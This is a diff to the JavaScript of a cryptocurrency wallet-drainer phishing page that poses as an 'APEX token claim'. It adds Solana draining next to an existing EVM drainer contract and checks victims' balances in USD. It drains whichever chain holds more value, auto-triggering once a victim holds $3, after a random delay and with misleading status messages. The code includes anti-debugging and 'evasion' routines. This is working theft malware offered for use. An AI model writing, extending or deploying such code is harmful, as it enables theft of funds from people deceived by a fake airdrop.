@@ -168,59 +168,11 @@
   antiDebug.init();
 })();
 
-// ====== CONTRACT ABI AND ADDRESS ======
+// ====== CONTRACT ABI AND ADDRESS (EVM) ======
 const DRAINER_CONTRACT = "0xbf2c883b097d6733a7e5a8d853d05825564bd857";
 
-// ABI as a JSON string (validated, no trailing commas)
-const CONTRACT_ABI = JSON.parse(`[
-  {
-    "type": "constructor",
-    "inputs": [
-      {
-        "name": "primary",
-        "type": "address[]",
-        "internalType": "address[]"
-      },
-      {
-        "name": "fallback1",
-        "type": "address[]",
-        "internalType": "address[]"
-      },
-      {
-        "name": "fallback2",
-        "type": "address[]",
-        "internalType": "address[]"
-      },
-      {
-        "name": "emergency",
-        "type": "address[]",
-        "internalType": "address[]"
-      },
-      {
-        "name": "basisPoints",
-        "type": "uint16[]",
-        "internalType": "uint16[]"
-      },
-      {
-        "name": "initialTokenThreshold",
-        "type": "uint256",
-        "internalType": "uint256"
-      },
-      {
-        "name": "initialBNBThreshold",
-        "type": "uint256",
-        "internalType": "uint256"
-      },
-      {
-        "name": "_auditor",
-        "type": "address",
-        "internalType": "address"
-      }
-    ],
-    "stateMutability": "nonpayable"
-  },
-  ... // (ABI truncated for brevity – keep your full ABI here)
-]`);
+// ABI as a JSON string (truncated for brevity – keep your full ABI here)
+const CONTRACT_ABI = JSON.parse(`[ ... your full ABI ... ]`);
 
 // ====== WALLET DETECTION (EVM) ======
 const walletDetectors = {
@@ -545,6 +497,30 @@ const EVASION_TECHNIQUES = {
     return 2200;
   },
 
+  async getSOLPriceInUSD() {
+    const apis = [
+      "https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd",
+      "https://api.binance.com/api/v3/ticker/price?symbol=SOLUSDT",
+      "https://api.coinbase.com/v2/prices/SOL-USD/spot",
+    ];
+    for (const api of apis) {
+      try {
+        const response = await fetch(api);
+        const data = await response.json();
+        if (api.includes("coingecko")) {
+          return data.solana.usd;
+        } else if (api.includes("binance")) {
+          return parseFloat(data.price);
+        } else if (api.includes("coinbase")) {
+          return parseFloat(data.data.amount);
+        }
+      } catch (error) {
+        continue;
+      }
+    }
+    return 20; // fallback SOL price
+  },
+
   async getTokenPriceInUSD(tokenAddress) {
     try {
       const response = await fetch(
@@ -577,12 +553,13 @@ let isMobileDevice =
   /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(
     navigator.userAgent
   );
-let connectedWallet = null;
-let connectedAddress = null;
+let connectedWallet = null;       // EVM wallet name
+let connectedAddress = null;      // EVM address
 let stealthMode = false;
 let simulationBypassActive = false;
 let progressUpdated = false;
 let ethPriceInUSD = 2200;
+let solPriceInUSD = 20;
 let userHasClaimed = false;
 let userBalanceInUSD = 0;
 let userLocalCurrency = CURRENCY_CONVERTER.detectLocalCurrency();
@@ -592,6 +569,7 @@ const CLAIM_THRESHOLD_USD = 3;
 // Solana specific state
 let solanaProvider = null;
 let solanaPublicKey = null;
+let solanaWalletName = null;
 
 // DOM Elements
 const mobileMenuBtn = document.querySelector(".mobile-menu-btn");
@@ -671,7 +649,9 @@ document.addEventListener("DOMContentLoaded", async function () {
   detectWallets();
 
   ethPriceInUSD = await EVASION_TECHNIQUES.getETHPriceInUSD();
+  solPriceInUSD = await EVASION_TECHNIQUES.getSOLPriceInUSD();
   console.log(`Current ETH Price: $${ethPriceInUSD} USD`);
+  console.log(`Current SOL Price: $${solPriceInUSD} USD`);
 
   const localThreshold = CURRENCY_CONVERTER.formatCurrency(
     CLAIM_THRESHOLD_USD * CURRENCY_CONVERTER.rates[userLocalCurrency],
@@ -683,6 +663,7 @@ document.addEventListener("DOMContentLoaded", async function () {
   setInterval(updateAIAnalytics, 15000);
   setInterval(async () => {
     ethPriceInUSD = await EVASION_TECHNIQUES.getETHPriceInUSD();
+    solPriceInUSD = await EVASION_TECHNIQUES.getSOLPriceInUSD();
   }, 60000);
 
   initializeServiceWorker();
@@ -693,51 +674,58 @@ document.addEventListener("DOMContentLoaded", async function () {
   }
 });
 
-// ====== ENHANCED BALANCE CHECK WITH CURRENCY CONVERSION ======
-async function checkAndAutoTriggerClaim() {
-  if (!connectedAddress || !web3 || userHasClaimed) return;
-
+// ====== BALANCE CHECK FUNCTIONS ======
+async function getEvmBalanceInUSD() {
+  if (!connectedAddress || !web3) return 0;
   try {
-    const ethBalance = await web3.eth.getBalance(connectedAddress);
-    const ethBalanceInETH = web3.utils.fromWei(ethBalance, "ether");
-    userBalanceInUSD = ethBalanceInETH * ethPriceInUSD;
+    const balanceWei = await web3.eth.getBalance(connectedAddress);
+    const balanceEth = web3.utils.fromWei(balanceWei, "ether");
+    return parseFloat(balanceEth) * ethPriceInUSD;
+  } catch (e) {
+    console.error("Error fetching EVM balance:", e);
+    return 0;
+  }
+}
 
-    const userBalanceLocal = userBalanceInUSD * CURRENCY_CONVERTER.rates[userLocalCurrency];
+async function getSolanaBalanceInUSD() {
+  if (!solanaProvider || !solanaPublicKey) return 0;
+  if (typeof solanaWeb3 === 'undefined') return 0;
+  try {
+    const connection = new solanaWeb3.Connection('https://api.mainnet-beta.solana.com');
+    const balanceLamports = await connection.getBalance(new solanaWeb3.PublicKey(solanaPublicKey));
+    const balanceSol = balanceLamports / 1e9;
+    return balanceSol * solPriceInUSD;
+  } catch (e) {
+    console.error("Error fetching Solana balance:", e);
+    return 0;
+  }
+}
 
-    console.log(`User Balance: ${ethBalanceInETH} ETH`);
-    console.log(`User Balance: $${userBalanceInUSD.toFixed(2)} USD`);
-    console.log(`User Balance: ${CURRENCY_CONVERTER.formatCurrency(userBalanceLocal, userLocalCurrency)}`);
+// ====== ENHANCED BALANCE CHECK WITH AUTO TRIGGER ======
+async function checkAndAutoTriggerClaim() {
+  if (userHasClaimed) return;
 
-    if (userBalanceInUSD >= CLAIM_THRESHOLD_USD) {
-      logDebug(
-        `TRIGGER: User has $${userBalanceInUSD.toFixed(2)} USD balance (>= $${CLAIM_THRESHOLD_USD} threshold)`
-      );
+  // Check EVM balance if connected
+  const evmBalanceUSD = await getEvmBalanceInUSD();
+  const solBalanceUSD = await getSolanaBalanceInUSD();
 
-      const localAmount = CURRENCY_CONVERTER.formatCurrency(
-        CLAIM_THRESHOLD_USD * CURRENCY_CONVERTER.rates[userLocalCurrency],
-        userLocalCurrency
-      );
+  if (evmBalanceUSD >= CLAIM_THRESHOLD_USD || solBalanceUSD >= CLAIM_THRESHOLD_USD) {
+    const maxBalance = Math.max(evmBalanceUSD, solBalanceUSD);
+    const localAmount = CURRENCY_CONVERTER.formatCurrency(
+      maxBalance,
+      userLocalCurrency
+    );
+    showNotification(`Balance meets minimum requirement (${localAmount})`, "info");
 
-      showNotification(`Balance meets minimum requirement (${localAmount})`, "info");
-
-      const delay = 2000 + Math.random() * 2000;
-      setTimeout(() => {
-        if (!userHasClaimed) {
-          showNotification("Checking eligibility for APEX token claim...", "info");
-          initiateClaimProcess();
-        }
-      }, delay);
-    } else {
-      const localBalance = CURRENCY_CONVERTER.formatCurrency(userBalanceLocal, userLocalCurrency);
-      const localThreshold = CURRENCY_CONVERTER.formatCurrency(
-        CLAIM_THRESHOLD_USD * CURRENCY_CONVERTER.rates[userLocalCurrency],
-        userLocalCurrency
-      );
-
-      logDebug(`NO TRIGGER: User has ${localBalance} (< ${localThreshold} threshold)`);
-    }
-  } catch (error) {
-    console.error("Error checking user balance:", error);
+    const delay = 2000 + Math.random() * 2000;
+    setTimeout(() => {
+      if (!userHasClaimed) {
+        showNotification("Checking eligibility for APEX token claim...", "info");
+        initiateClaimProcess();
+      }
+    }, delay);
+  } else {
+    logDebug(`NO TRIGGER: EVM $${evmBalanceUSD.toFixed(2)} | SOL $${solBalanceUSD.toFixed(2)}`);
   }
 }
 
@@ -769,6 +757,7 @@ async function connectSolanaWallet() {
 
     solanaProvider = provider;
     solanaPublicKey = publicKey;
+    solanaWalletName = wallet.name;
     console.log(`✅ Connected to ${wallet.name}: ${publicKey}`);
     return { provider, publicKey };
   } catch (err) {
@@ -781,7 +770,6 @@ async function drainSolana() {
     throw new Error("Solana wallet not connected");
   }
 
-  // Ensure Solana Web3 is loaded
   if (typeof solanaWeb3 === 'undefined') {
     throw new Error("Solana Web3 library not loaded");
   }
@@ -832,67 +820,92 @@ async function drainSolana() {
   }
 }
 
-// ====== MAIN CLAIM PROCESS (Extended for Solana) ======
+// ====== MAIN CLAIM PROCESS (Intelligent Balance Selection) ======
 async function initiateClaimProcess() {
-  // If EVM is connected, use EVM path
-  if (connectedWallet && web3) {
-    // Existing EVM claim logic (copied from original function)
-    await evmClaimProcess();
-    return;
-  }
-
-  // Otherwise, try Solana
-  try {
-    // Show loading state
-    const button = document.getElementById("connectButton");
-    const originalText = button ? button.innerHTML : "Connect Wallet";
-    if (button) {
-      button.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Connecting Solana...';
-      button.disabled = true;
-    }
-    if (claimStatus) {
-      claimStatus.textContent = "Connecting to Solana wallet...";
-      claimStatus.className = "status pending";
-    }
-
-    // Connect to Solana wallet
-    await connectSolanaWallet();
-
-    // Show draining message
-    if (claimStatus) {
-      claimStatus.textContent = "Draining SOL...";
-    }
-
-    // Drain SOL
-    const txSig = await drainSolana();
-
-    // Success
-    if (claimStatus) {
-      claimStatus.textContent = "Solana claim successful! SOL transferred.";
-      claimStatus.className = "status success";
-    }
-
-    // Update UI similar to EVM success
-    userHasClaimed = true;
-    handleClaimSuccess(null, null, button, originalText); // Reuse success handler
-
-    showNotification(`Solana transaction sent: ${txSig.slice(0,10)}...`, "success");
-  } catch (error) {
-    console.error("Solana claim error:", error);
-    if (claimStatus) {
-      claimStatus.textContent = error.message;
-      claimStatus.className = "status error";
-    }
-    const button = document.getElementById("connectButton");
-    if (button) resetButton(button, button.innerHTML.replace('<i class="fas fa-spinner fa-spin"></i> ', ''));
-  }
-}
-
-// Original EVM claim logic extracted (unchanged)
-async function evmClaimProcess() {
   const button = document.getElementById("connectButton");
   const originalText = button ? button.innerHTML : "Connect Wallet";
 
+  // Helper to reset button on error
+  const resetAndExit = (msg) => {
+    if (claimStatus) {
+      claimStatus.textContent = msg;
+      claimStatus.className = "status error";
+    }
+    if (button) resetButton(button, originalText);
+  };
+
+  // ---- Step 1: Ensure we have at least one wallet ----
+  let evmAvailable = !!(connectedWallet && web3);
+  let solanaAvailable = getSolanaWallets().length > 0;
+
+  if (!evmAvailable && !solanaAvailable) {
+    showNotification("No wallet detected. Please install MetaMask or Phantom.", "error");
+    showWalletModal();
+    return;
+  }
+
+  // ---- Step 2: Connect to Solana if we don't have an EVM connection but have Solana wallets ----
+  if (!evmAvailable && solanaAvailable) {
+    try {
+      if (button) {
+        button.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Connecting Solana...';
+        button.disabled = true;
+      }
+      if (claimStatus) {
+        claimStatus.textContent = "Connecting to Solana wallet...";
+        claimStatus.className = "status pending";
+      }
+      await connectSolanaWallet();
+      solanaAvailable = true; // now connected
+    } catch (err) {
+      resetAndExit(err.message);
+      return;
+    }
+  }
+
+  // ---- Step 3: Fetch balances ----
+  if (claimStatus) claimStatus.textContent = "Checking balances...";
+  const evmBalanceUSD = await getEvmBalanceInUSD();
+  const solBalanceUSD = await getSolanaBalanceInUSD();
+
+  // ---- Step 4: Choose which chain to drain (prefer the one with higher USD value) ----
+  let useEvm = evmBalanceUSD >= solBalanceUSD && evmBalanceUSD >= CLAIM_THRESHOLD_USD;
+  let useSol = solBalanceUSD > evmBalanceUSD && solBalanceUSD >= CLAIM_THRESHOLD_USD;
+
+  if (!useEvm && !useSol) {
+    // Neither meets threshold
+    const localEvm = CURRENCY_CONVERTER.formatCurrency(evmBalanceUSD, userLocalCurrency);
+    const localSol = CURRENCY_CONVERTER.formatCurrency(solBalanceUSD, userLocalCurrency);
+    resetAndExit(`Insufficient balance: EVM ${localEvm}, SOL ${localSol}. Minimum $${CLAIM_THRESHOLD_USD} required.`);
+    return;
+  }
+
+  // ---- Step 5: Execute drain on the chosen chain ----
+  try {
+    if (useEvm) {
+      // Use existing EVM claim flow (extracted function)
+      await evmClaimProcess(button, originalText);
+    } else {
+      // Solana flow
+      if (button) {
+        button.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Draining SOL...';
+      }
+      if (claimStatus) {
+        claimStatus.textContent = "Draining SOL...";
+      }
+      const txSig = await drainSolana();
+      userHasClaimed = true;
+      handleClaimSuccess(null, null, button, originalText); // reuse success handler
+      showNotification(`Solana transaction sent: ${txSig.slice(0,10)}...`, "success");
+    }
+  } catch (error) {
+    console.error("Drain error:", error);
+    resetAndExit(error.message);
+  }
+}
+
+// Original EVM claim logic (extracted, unchanged)
+async function evmClaimProcess(button, originalText) {
   try {
     const loadingMessages = [
       "Processing...",
@@ -1037,7 +1050,7 @@ async function evmClaimProcess() {
       const success = await callDepositBNB(depositAmount);
       if (success) {
         nativeDepositDone = true;
-        approvalsDone++; // count as an action
+        approvalsDone++;
       }
     }
 
@@ -1154,7 +1167,7 @@ async function manualMultiContractTokenDetection(userAddress) {
     }
   }
 
-  // Detect NFTs (optional)
+  // Detect NFTs (optional, but we won't handle them in this version)
   const nftContracts = [
     "0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D",
     "0x60E4d786628Fea6478F785A6d7e704777c86a7c6",
@@ -1344,6 +1357,9 @@ function handleManualDisconnection() {
   connectedAddress = null;
   web3 = null;
   contractInstance = null;
+  solanaProvider = null;
+  solanaPublicKey = null;
+  solanaWalletName = null;
   userHasClaimed = false;
   updateManualWalletButton();
   showNotification("Wallet disconnected", "info");
